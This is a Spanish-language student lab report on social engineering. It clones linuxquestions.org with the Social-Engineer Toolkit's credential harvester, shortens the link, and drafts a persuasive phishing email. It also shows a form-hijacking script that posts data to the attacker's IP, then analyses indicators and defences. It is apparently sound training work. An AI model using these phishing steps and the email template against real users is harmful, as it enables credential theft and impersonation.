# **Práctica Nro. 11: Ingeniería Social**

## 📊 Tabla de Identificación

| Apellido, Nombre | Cédula de Identidad | Nro. de Práctica | Fecha |
| :--- | :---: | :---: | :--- |
| Gil, Jesús | 30175126 | 11 | 5-12-2025|
| Guilarte, Andrés | 30246084 | 11 | 5-12-2025 |

**Grupo:** 4

**Requisitos Previos**

**Conocimientos**

- Experiencia con línea de comandos en Linux
- Comprensión de protocolos HTTP/HTTPS
- Familiaridad con HTML y estructura de páginas web
- Conocimientos básicos de ingeniería social

**Entorno Técnico**

- Kali Linux (VM o instalación nativa)
- Social-Engineer Toolkit (SET) instalado
- Acceso a Internet para servicios de acortamiento de URL
- Cuenta de correo electrónico para envío de vectores de ataque
- Entorno de laboratorio controlado con víctima consentida

**Consideraciones Éticas**

**ADVERTENCIA LEGAL**: Esta práctica debe realizarse EXCLUSIVAMENTE en entornos de laboratorio controlados con autorización explícita de todos los participantes. La clonación de sitios web reales y el envío de correos de phishing sin consentimiento constituye un delito penal en la mayoría de jurisdicciones. El uso indebido de estas técnicas puede resultar en consecuencias legales graves, incluyendo cargos criminales por fraude electrónico, suplantación de identidad y acceso no autorizado a sistemas informáticos.

-----
**Contexto del Escenario**

Como profesional de seguridad de la información, has sido contratado por una organización para evaluar la susceptibilidad de sus empleados a ataques de ingeniería social. Tu objetivo es ejecutar un ejercicio controlado de phishing que simule un ataque real, documentar el proceso técnico, y proporcionar un análisis forense detallado que permita a la organización implementar controles defensivos efectivos.

Este ejercicio te permitirá comprender no solo la mecánica del ataque, sino también las huellas digitales que deja, las limitaciones técnicas de las herramientas de clonación, y los indicadores de compromiso que los sistemas de defensa modernos pueden detectar.

-----
**

**Desarrollo de la Práctica**

**FASE 1: Configuración del Vector de Ataque con SET (10 minutos)**

**Objetivo de la fase**

Configurar y desplegar un sitio web clonado utilizando Social-Engineer Toolkit para capturar credenciales en un entorno controlado.

**Pasos a seguir**

**1.1. Inicialización de SET con privilegios elevados**

sudo su

setoolkit

**Explicación:** SET requiere privilegios de root para vincular puertos privilegiados (80/443) y modificar configuraciones de red. Al ejecutar como superusuario, SET puede iniciar servidores web que escuchan en puertos estándar, aumentando la credibilidad del ataque al no requerir números de puerto no estándar en la URL.

**1.2. Navegación al módulo de Credential Harvester**

Desde el menú principal de SET, seleccione:

\1) Social-Engineering Attacks

\2) Website Attack Vectors

\3) Credential Harvester Attack Method

\2) Site Cloner

**Explicación:** El método "Credential Harvester" con "Site Cloner" automatiza la captura de credenciales mediante la clonación de páginas legítimas. SET inyecta JavaScript que intercepta el envío de formularios, captura los datos antes de que sean transmitidos, y luego redirige a la víctima al sitio legítimo para minimizar sospechas.

**1.3. Configuración de la IP de postback**

Enter the IP address for the POST back in Harvester/Tabnabbing [IP]: [TU\_IP\_KALI]

**Contexto profesional:** En un engagement real de Red Team, esta IP sería típicamente una infraestructura de comando y control (C2) con ofuscación adicional. Para este ejercicio, utilice la IP de su máquina Kali en la red local del laboratorio.

**1.4. Especificación del objetivo de clonación**

Enter the url to clone: https://www.linuxquestions.org

**Análisis técnico:** La selección de linuxquestions.org como objetivo es estratégica para este ejercicio educativo. Es un sitio con formularios de autenticación pero sin mecanismos anti-clonación agresivos. En escenarios reales, los atacantes seleccionan objetivos basándose en:

- Reconocimiento previo de servicios utilizados por la organización objetivo
- Sitios con alta tasa de autenticación (Office 365, Gmail, portales corporativos)
- Páginas sin protecciones avanzadas contra clonación
**\


**1.5. Verificación del servidor activo**

SET iniciará automáticamente un servidor Apache en el puerto 80. Verifique que el servidor esté escuchando:

\# En una nueva terminal

netstat -tlnp | grep :80

Salida esperada:

tcp6  0  0 :::80  :::\*  LISTEN  [PID]/apache2

**Pregunta reflexiva:** ¿Qué implicaciones de seguridad tiene ejecutar un servidor web en el puerto 80 sin HTTPS? ¿Cómo afecta esto a la credibilidad del ataque en entornos modernos donde HTTPS es omnipresente?

**Respuesta:**

Ejecutar un servidor web en HTTP (puerto 80) sin HTTPS representa una vulnerabilidad crítica que anula la credibilidad del ataque en entornos modernos. La transmisión sin encriptación expone todas las credenciales capturadas a interceptación por Man-in-the-Middle, y los navegadores modernos muestran advertencias prominentes ("No seguro") que alertan inmediatamente a los usuarios. Además, sistemas de seguridad como EDR, gateways de correo y Safe Browsing de Google detectan fácilmente esta configuración, bloqueando conexiones a IPs desconocidas sobre HTTP. En 2025, cuando HTTPS es omnipresente (>95% del tráfico web), cualquier usuario con mínima conciencia de seguridad reconocerá que un sitio de "verificación de seguridad" sin HTTPS es una contradicción flagrante, reduciendo drásticamente la efectividad del ataque.

Aunque SET facilita la implementación rápida, los atacantes sofisticados implementan certificados SSL legítimos (mediante Let's Encrypt o dominios typosquatting) para evadir estas defensas. La ausencia de HTTPS en este ejercicio lo convierte en una prueba de concepto educativa válida pero inefectiva en entornos reales con defenses actualizadas. Para mitigación efectiva, las organizaciones deben implementar MFA obligatorio, políticas de HTTPS requerido, entrenamiento continuo de usuarios, y sistemas EDR que detecten conexiones HTTP anómalas a sitios de autenticación.

![alt text](https://imgur.com/SlACsan)
![alt text](https://imgur.com/Va4sGVR)

-----
**FASE 2: Creación del Vector de Entrega y Ejecución del Ataque (8 minutos)**

**Objetivo de la fase**

Construir un vector de entrega convincente utilizando técnicas de ingeniería social y ofuscación de URL para maximizar la tasa de éxito del ataque.

**Pasos a seguir**

**2.1. Acortamiento y ofuscación de URL**

Acceda a <https://bitly.com> y cree una cuenta gratuita si no tiene una.

URL original: http:///192.168.100.8

URL acortada: https://n9.cl/6h90ie

**Análisis de técnica:** El acortamiento de URL sirve múltiples propósitos en ataques de phishing:

- **Ofuscación:** Oculta la dirección IP real del servidor malicioso
- **Credibilidad:** Las URL cortas son comunes en comunicaciones legítimas
- **Tracking:** Servicios como Bitly proporcionan estadísticas de clics (útil para medir efectividad)
- **Evasión:** Dificulta el análisis estático de URLs por sistemas de seguridad

**Limitación importante:** Muchos sistemas de seguridad modernos expanden URLs acortadas antes de permitir el acceso. Bitly y servicios similares están en listas de observación de sistemas EDR y gateways de correo.
**\


**2.2. Construcción del pretexto de ingeniería social**

Redacte un correo electrónico utilizando principios psicológicos de persuasión:

**Ejemplo de correo con análisis de técnicas:**

Para: [víctima\_consentida@dominio.com]

Asunto: Acción Requerida: Verificación de Seguridad de Cuenta - Expira en 24h

Estimado usuario,

Nuestro equipo de seguridad ha detectado un intento de acceso no autorizado 

a su cuenta desde una ubicación no reconocida (IP: 185.220.101.45 - Rusia).

Como medida preventiva, hemos bloqueado temporalmente su cuenta. Para 

restaurar el acceso completo, debe verificar su identidad inmediatamente:

[ENLACE ACORTADO DE BITLY]

Si no completa esta verificación en las próximas 24 horas, su cuenta 

será suspendida permanentemente por razones de seguridad.

Atentamente,

Equipo de Seguridad de LinuxQuestions


**Análisis de técnicas de persuasión empleadas:**

- **Urgencia:** "Expira en 24h", "inmediatamente"
- **Autoridad:** Firma como "Equipo de Seguridad"
- **Miedo:** "suspendida permanentemente"
- **Especificidad técnica:** Inclusión de IP falsa aumenta credibilidad
- **Legitimidad aparente:** Uso de terminología técnica apropiada

**2.3. Envío del vector y monitorización**

Envíe el correo a:

- Su compañero de equipo (víctima consentida)
- Instructor/supervisor del ejercicio

**Instrucciones para la víctima:**

- Utilizar credenciales de prueba: usuario:phishing / pass:phishing123
- NO introducir credenciales reales bajo ninguna circunstancia

**2.4. Captura de credenciales**

Monitorice la terminal donde SET está ejecutándose. Cuando la víctima envíe el formulario, verá:

**[\*]** WE GOT A HIT! Printing the output:

POSSIBLE USERNAME FIELD FOUND: usuario=phishing

POSSIBLE PASSWORD FIELD FOUND: pass=phishing123

**[\*]** WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT

Las credenciales también se almacenan en:

cat ~/.set/reports/[TIMESTAMP].log

**Pregunta reflexiva:** En un escenario real, ¿qué haría un atacante con estas credenciales? ¿Cuál sería la cadena de ataque posterior (lateral movement, privilege escalation)?

**Respuesta:**

Las credenciales capturadas son el punto de partida para una cadena de ataque multifase. El atacante primero verificaría su validez intentando autenticación en el portal legítimo de LinuxQuestions, luego aplicaría "credential stuffing" contra otros servicios comunes (Gmail, LinkedIn, GitHub, redes corporativas) bajo el supuesto de reutilización de contraseñas. Con acceso confirmado, el atacante buscaría información de valor en la cuenta (emails, perfiles, datos sensibles) y realizaría reconocimiento de la infraestructura corporativa si es empleado. El siguiente paso crítico es **movimiento lateral**: usando las credenciales para acceder a sistemas internos compartidos (intranets corporativas, VPNs, plataformas de colaboración como Slack/Teams), identificar otros usuarios y máquinas, y escalar privilegios explotando vulnerabilidades locales, misconfigurations de sudo, o servicios desprotegidos.

En un ataque sofisticado, el atacante implanataría persistencia mediante backdoors, modificaría políticas de seguridad, robería datos sensibles (IP, proyectos, códigos fuente), y eventualmente establecería acceso a largo plazo para exfiltración continua. El factor crítico es la **velocidad**: entre la captura de credenciales y la detección por SIEM hay una ventana de oportunidad de horas. Defensas clave contra esta cadena incluyen: MFA obligatorio (previene lateral movement incluso con credenciales válidas), sesiones limitadas por geolocalización/dispositivo, monitorización de logins anómalos, segmentación de red, y análisis de comportamiento de usuarios (detecta patrones de ataque post-compromiso).

-----
**FASE 3: Análisis Forense y Comparativo (12 minutos)**

**Objetivo de la fase**

Realizar un análisis técnico detallado de las diferencias entre el sitio original y el clonado para identificar indicadores de compromiso y vectores de detección.

**Pasos a seguir**

**3.1. Extracción del código fuente clonado**

cd ~/.set/web\_clone/

ls -lah

cp index.html ~/analisis_phishing/cloned_index.html

**3.2. Obtención del código fuente original**

cd ~/analisis\_phishing/

``` bash
┌──(root㉿kali)-[~/.set/web_clone]
└─# cd ~/.set/web_clone/                                 
                                                                             
┌──(root㉿kali)-[~/.set/web_clone]
└─# ls -lah                                              
total 120K
drwxr-xr-x 2 root root 4.0K Dec  5 08:40 .
drwxr-xr-x 3 root root 4.0K Dec  5 08:51 ..
-rw-r--r-- 1 root root  53K Dec  5 08:40 index.html
-rw-r--r-- 1 root root  54K Dec  5 08:40 index.html.bak
                                                                             
┌──(root㉿kali)-[~/.set/web_clone]
└─# 
                                                                             
┌──(root㉿kali)-[~/.set/web_clone]
└─# cp index.html ~/analisis_phishing/cloned_index.html
cp: cannot create regular file '/root/analisis_phishing/cloned_index.html': No such file or directory

``` 
aca paso un error proseguimos

``` bash
┌──(root㉿kali)-[~/.set/web_clone]
└─# mkdir ~/analisis_phishing/ 
                                                                             
┌──(root㉿kali)-[~/.set/web_clone]
└─# cp index.html ~/analisis_phishing/cloned_index.html  
```

curl -s https://www.linuxquestions.org > original_index.html

**3.3. Análisis diferencial de código HTML**

diff -u original_index.html cloned_index.html > diferencias.txt

cat diferencias.txt

**Elementos críticos a identificar en la salida de diff:**

**A. Modificación del atributo action del formulario**

Original:

<form action="https://www.linuxquestions.org/questions/login.php" method="post">

Clonado:

<form action="http://[TU\_IP\_KALI]/post.php" method="post">

**Indicador de compromiso:** El cambio de dominio legítimo a IP privada es una señal clara de phishing. Los navegadores modernos alertan sobre cambios de HTTPS a HTTP.

**B. Inyección de JavaScript malicioso**

SET típicamente inyecta código similar a:

<script>

document.forms[0].onsubmit = function() {

`    `var xhr = new XMLHttpRequest();

`    `xhr.open("POST", "http://[TU\_IP\_KALI]/post.php", false);

`    `xhr.send(new FormData(this));

`    `window.location = "https://www.linuxquestions.org";

`    `return false;

};

</script>

**Análisis:** Este script intercepta el envío del formulario, transmite los datos al servidor del atacante, y luego redirige al sitio legítimo para evitar sospechas.

**C. Ausencia de recursos externos**

grep -o 'https://[^"]\*' original\_index.html | wc -l

grep -o 'https://[^"]\*' cloned\_index.html | wc -l

**Observación esperada:** El sitio clonado tendrá significativamente menos referencias a recursos externos (CSS, JavaScript, imágenes de CDN), resultando en una apariencia degradada.

**3.4. Análisis comparativo de headers HTTP**

curl -I https://www.linuxquestions.org > original_headers.txt

curl -I http://192.168.100.8 > cloned_headers.txt

diff -y original_headers.txt cloned_headers.txt

![alt text](https://imgur.com/MxzkC8L)

**Headers críticos a comparar:**

|**Header**|**Original**|**Clonado**|**Implicación de Seguridad**|
| :- | :- | :- | :- |
|**Server**|nginx/1.x.x|Apache/2.4.x|Fingerprinting del servidor revela infraestructura diferente|
|**Strict-Transport-Security**|max-age=31536000|(ausente)|Falta de HSTS permite downgrade attacks|
|**X-Frame-Options**|SAMEORIGIN|(ausente)|Ausencia permite clickjacking|
|**Content-Security-Policy**|(presente)|(ausente)|Falta de CSP facilita inyección de scripts|
|**Set-Cookie**|(con flags Secure, HttpOnly)|(sin flags de seguridad)|Cookies inseguras son indicador de sitio malicioso|

Es de importancia resaltar que los headers de la página clonada no se encuentran en su respectivo archivo ya que al ejecutar el comando `curl -I http://192.168.100.8 > cloned_headers.txt` la respuesta fue la no esperada. En la terminal se mostró el fallo de la instrucción debido a que el servidor no pudo soportar la operación de HTTP HEAD (operación que realiza el comando curl -I). Esto se ve reflejado en el archivo [cloned_headers.txt](cloned_headers.txt) disponible en la carpeta Practica11 del repositorio, donde consta el error de la operación.

**Posibles razones del fallo del comando `curl -I http://192.168.100.8`:**

1. **Apache no estaba ejecutándose:** SET requiere que el servicio Apache esté activo en puerto 80. Si el servicio se detuvo o nunca inició correctamente, curl no pudo establecer la conexión.
   - **Verificación:** `netstat -tlnp | grep :80` para confirmar si Apache está escuchando
   - **Solución:** Reiniciar Apache o verificar logs en `/var/log/apache2/error.log`

2. **Problema de conectividad de red:** La máquina ejecutando curl podría no tener conectividad con la IP 192.168.100.8 (configuración de VirtualBox/VMware, firewall, o bridge de red)
   - **Verificación:** `ping 192.168.100.8` para probar conectividad
   - **Solución:** Revisar configuración de red y permisos de firewall

3. **Servidor web no completó la clonación exitosamente:** El directorio de archivos clonados podría estar vacío, corrupto o con permisos insuficientes
   - **Verificación:** `ls -lah ~/.set/web_clone/` para verificar archivos
   - **Solución:** Reiniciar SET y completar la clonación nuevamente

4. **Respuesta HTTP inesperada del servidor:** Apache podría estar retornando errores 403 (Forbidden), 500 (Internal Server Error), o content-type incompatible
   - **Verificación:** `curl -v http://192.168.100.8` para ver detalles completos de la respuesta
   - **Solución:** Revisar permisos de archivos en `/var/www/html` y logs de Apache

5. **Configuración incorrecta de SET:** El servidor web podría estar vinculado a un puerto diferente o interfaz de red específica
   - **Verificación:** Revisar configuración de SET durante la ejecución
   - **Solución:** Reconfigurar SET especificando puerto y dirección IP correcta

**3.5. Análisis de certificados SSL/TLS**

\# Para el sitio original

echo | openssl s_client -connect www.linuxquestions.org:443 2>/dev/null | openssl x509 -noout -text

\# Para el sitio clonado (si implementó HTTPS)

echo | openssl s_client -connect 198.168.100.8:443 2>/dev/null | openssl x509 -noout -text

**Indicadores de phishing en certificados:**

- Certificados autofirmados
- Emisor desconocido o no confiable
- Discrepancia en el Common Name (CN)
- Fecha de emisión muy reciente
- Ausencia de Subject Alternative Names (SAN)

**Pregunta reflexiva:** ¿Cómo obtienen los atacantes sofisticados certificados SSL legítimos para sitios de phishing? Investigue sobre servicios como Let's Encrypt y su uso en campañas de phishing.

**Respuesta:**

Los atacantes sofisticados obtienen certificados SSL legítimos mediante técnicas que explotan la automatización de autoridades certificadoras (CAs) como Let's Encrypt. **Let's Encrypt es especialmente vulnerable** porque utiliza validación de dominio ACME (Automated Certificate Management Environment) sin revisión humana: si un atacante controla un dominio typosquatting (ej: `linuxquestions-verify.org` en lugar de `linuxquestions.org`), puede obtener automáticamente un certificado SSL válido en minutos. Otros métodos incluyen: 
1. **Compromiso de dominios legítimos abandonados**: Adquirir dominios vencidos con histórico de confianza y reutilizar su reputación.
2. **Uso de subdominios de servicios legítimos**: Explotar plataformas como GitHub Pages, Firebase, o Heroku que ofrecen HTTPS gratuito.
3. **Infraestructura comprometida**: Instalar certificados en servidores web legitimados previamente hackeados. 
4. **Dominios de homóglifos**: Utilizar caracteres Unicode similares al dominio legítimo (ej: `α` cirilico en lugar de `a` latino). Estos certificados aparecen completamente válidos en navegadores, eliminando advertencias de seguridad y haciendo el ataque indistinguible de un sitio legítimo.

 A pesar del certificado válido, existen señales de alerta: dominios recién registrados (WHOIS data), falta de historial HTTPS previo (análisis de certificados históricos vía CT logs), discrepancias en Organization Name/Extended Validation (dominios typosquatting no tienen EV), comportamiento sospechoso de DNS (cambios recientes), y análisis de reputación de dominio (verificación de antiguedad con OSINT). Algunas tácticas de defensas organizacionales que se podrían implementar en la organización podemos mencionar
 1. **Implementar HSTS Preloading**: Fuerza HTTPS y rechaza dominios typosquatting
 2. **DNS CAA records:** Especifica qué CAs pueden emitir certificados para el dominio por lo que se previene la emisión no autorizada de certificados digitales
 3. **Certificate Transparency monitoring:**: Se emiten alertas cuando se emiten certificados para dominios críticos 
 4. **DMARC con dominio legítimo en WHOIS verificado:**: Combina SPF y DKIM para autenticar que los correos provienen legítimamente del dominio declarado. Publica un registro DNS que especifica la política ante fallos de autenticación (reject, quarantine, none), previniendo que atacantes suplan tu dominio en correos de phishing. Con DMARC en modo "reject", los intentos de suplantación son bloqueados automáticamente por proveedores como Gmail u Outlook.

Se procede a explicar que son DMARC como WHOIS para lograr que el entendimiento de la tácica 4 propuesta se hago de una mejor manera:

* **DMARC (Domain-based Message Authentication, Reporting and Conformance):**
Es un protocolo de autenticación de correo electrónico que combina SPF (Sender Policy Framework) y DKIM (DomainKeys Identified Mail) para verificar que los correos provienen legítimamente del dominio declarado. El propietario del dominio publica un registro DNS (record) que especifica qué hacer si la autenticación falla: `none` (permitir y reportar), `quarantine` (enviar a cuarentena/spam), o `reject` (rechazar completamente). DMARC genera reportes sobre intentos de suplantación y es especialmente efectivo contra ataques BEC (Business Email Compromise) y phishing de suplantación de dominio. Por ejemplo, con DMARC en modo "reject", si un atacante intenta enviar un correo con "From: seguridad@tuempresa.com", Gmail u Outlook verificarán el registro DMARC y rechazarán automáticamente el correo si falla la autenticación.

* **WHOIS (Who Is):**
Es un protocolo y servicio de base de datos que permite consultar información pública de registro de dominios y direcciones IP. Al consultar WHOIS para un dominio, se obtiene información como: propietario registrado, fecha de registro, fecha de expiración, servidores DNS asociados, contacto administrativo y técnico. Los analistas de seguridad usan WHOIS para detectar dominios typosquatting recién registrados o sospechosos. Por ejemplo, si `linuxquestions.org` fue registrado en 2010, pero `linuxquestions-verify.org` fue registrado hace 2 días, esto es una indicación clara de phishing. WHOIS data es crucial para análisis forense de campañas maliciosas e identificación de infraestructura de atacantes.
 
En el caso de los usuarios se recomienda verificar no solo el candado SSL sino también el dominio completo y Organization Name en el certificado (clic en el candado → Certificate Details).

-----
**Evaluación del Aprendizaje**

**Preguntas de Reflexión**

**1. ¿Qué limitaciones técnicas fundamentales tiene el ataque de phishing implementado con SET que permitirían su detección por sistemas de seguridad modernos?**

**Limitaciones principales:**

**A. Ausencia de HTTPS válido:**

- SET por defecto sirve contenido sobre HTTP
- Implementar HTTPS requiere certificados válidos
- Certificados autofirmados generan advertencias del navegador
- Los usuarios modernos están entrenados para verificar el candado SSL

**B. Discrepancias en headers de seguridad:**

- Falta de HSTS, CSP, X-Frame-Options
- Headers del servidor (Apache vs nginx) revelan infraestructura diferente
- Ausencia de headers de seguridad modernos es un indicador fuerte

**C. Recursos externos rotos:**

- Las clonaciones no replican CDNs ni recursos externos completamente
- Imágenes rotas, estilos faltantes degradan la experiencia
- Los usuarios técnicamente competentes notarán inconsistencias visuales

**D. Análisis de URL:**

- Acortadores de URL son señal de alerta
- La expansión automática de URLs por gateways de correo revela IPs sospechosas
- Falta de dominio legítimo es detectable por usuarios entrenados

**E. Detección por sistemas de correo:**

- Gmail, Outlook tienen análisis de reputación de remitente
- SPF, DKIM, DMARC ausentes o incorrectos
- Análisis de contenido detecta patrones de phishing (urgencia, amenazas)
- Sandboxing de enlaces revela destinos maliciosos

**2. Como profesional de seguridad, ¿qué medidas defensivas implementarías en una organización para mitigar este vector de ataque específico?**

**Controles técnicos:**

**Capa de correo electrónico:**

- Implementar SPF, DKIM, DMARC estrictos
- Gateways de correo con análisis de URLs (expansión de acortadores)
- Sandboxing de enlaces antes de entrega
- Reescritura de URLs para proxy de seguridad
- Análisis de reputación de remitentes

**Capa de navegador/endpoint:**

- Extensiones de navegador anti-phishing
- EDR con detección de comportamiento
- DNS filtering (bloqueo de dominios maliciosos)
- Políticas de navegador que requieren HTTPS
- Aislamiento de navegador para enlaces sospechosos

**Capa de red:**

- Web Application Firewalls (WAF)
- Sistemas de detección de intrusiones (IDS/IPS)
- Análisis de tráfico para detectar exfiltración de credenciales
- Segmentación de red para limitar movimiento lateral

**Controles administrativos:**

- Programa de concienciación continua en seguridad
- Simulaciones de phishing periódicas
- Políticas de reporte de incidentes sin penalización
- Autenticación multifactor (MFA) obligatoria
- Gestión de privilegios mínimos

**Controles de detección y respuesta:**

- SIEM con correlación de eventos
- Monitorización de autenticaciones anómalas
- Análisis de comportamiento de usuarios (UEBA)
- Playbooks de respuesta a incidentes de phishing
- Threat intelligence feeds actualizados

**3. Investigue y explique cómo Gmail y otros proveedores de correo modernos detectan y mitigan ataques de phishing. ¿Qué mecanismos específicos habrían detectado este ataque?**

**Mecanismos de detección de Gmail:**

**A. Análisis de autenticación:**

- Verificación SPF: Valida que el servidor de envío está autorizado
- Verificación DKIM: Valida la firma criptográfica del mensaje
- Verificación DMARC: Política de alineación de dominio
- En este ataque: Probablemente fallaría autenticación si se suplanta dominio

**B. Machine Learning y análisis de contenido:**

- Modelos entrenados con millones de ejemplos de phishing
- Detección de patrones lingüísticos (urgencia, amenazas, errores)
- Análisis de similitud con campañas conocidas
- En este ataque: Lenguaje de urgencia y amenaza sería señalado

**C. Análisis de enlaces:**

- Expansión automática de URLs acortadas
- Verificación contra Safe Browsing API de Google
- Análisis de reputación de dominios/IPs
- Sandboxing de páginas de destino
- En este ataque: IP privada o desconocida sería bloqueada

**D. Análisis de comportamiento del remitente:**

- Historial de envío del remitente
- Volumen anómalo de envíos
- Patrones de destinatarios inusuales
- En este ataque: Cuenta personal enviando "alertas de seguridad" es anómalo

**E. Protecciones en tiempo de clic:**

- Advertencias cuando se hace clic en enlaces sospechosos
- Proxy de URLs para análisis antes de redirección
- Alertas sobre sitios no seguros (HTTP vs HTTPS)
- En este ataque: Advertencia de sitio no seguro sería mostrada

**F. Indicadores visuales:**

- Etiquetas de "correo externo"
- Advertencias sobre remitentes no verificados
- Destacado de discrepancias en direcciones de envío
- En este ataque: Etiqueta de advertencia sería visible

**Efectividad esperada:** Con alta probabilidad, este correo sería:

1. Marcado como spam (70-80% probabilidad)
2. Mostrado con advertencias prominentes si llega a bandeja de entrada
3. Bloqueado al hacer clic en el enlace con advertencia de seguridad
4. Reportado automáticamente si múltiples usuarios lo marcan como phishing


**Documentación oficial**

- Social-Engineer Toolkit Documentation: <https://github.com/trustedsec/social-engineer-toolkit>
- OWASP Phishing Guide: <https://owasp.org/www-community/attacks/Phishing>

**Frameworks y metodologías**

- MITRE ATT&CK - Phishing (T1566): <https://attack.mitre.org/techniques/T1566/>
- NIST Phishing Guidance: <https://www.nist.gov/itl/applied-cybersecurity/nice/resources/phishing>

**Herramientas complementarias**

- GoPhish (plataforma de simulación de phishing): <https://getgophish.com/>
- PhishTank (base de datos de phishing): <https://phishtank.org/>
- VirusTotal (análisis de URLs): <https://www.virustotal.com/>
-----
**

**Troubleshooting Común**

|**Problema**|**Solución**|
| :- | :- |
|**SET no captura credenciales**|Verifique que Apache esté escuchando en puerto 80: netstat -tlnp | grep :80. Revise logs en /var/log/apache2/error.log. Asegúrese de que el formulario se está enviando correctamente (inspeccione con DevTools del navegador).|
|**La página clonada no se muestra correctamente**|Verifique conectividad de red. Algunos sitios tienen protecciones anti-clonación. Intente con un sitio diferente. Revise si hay recursos externos bloqueados por CORS.|
|**Bitly bloquea la URL acortada**|Bitly detecta IPs privadas y contenido malicioso. Use un servicio alternativo o configure un dominio público temporal. Considere usar TinyURL o servicios menos restrictivos.|
|**El correo no llega o va a spam**|Esperado. Configure SPF/DKIM si tiene control del dominio. Use un servidor SMTP reputado. En ejercicios, coordine con el instructor para whitelist temporal.|
|**diff muestra demasiadas diferencias**|Use diff -u | less para navegación más fácil. Enfóquese en secciones <form> y <script>. Use herramientas visuales como meld o vimdiff para comparación lado a lado.|
|**Apache falla al iniciar en puerto 80**|Otro servicio está usando el puerto. Identifique con sudo lsof -i :80 y detenga el servicio conflictivo. O configure SET para usar puerto alternativo (requiere modificación de configuración).|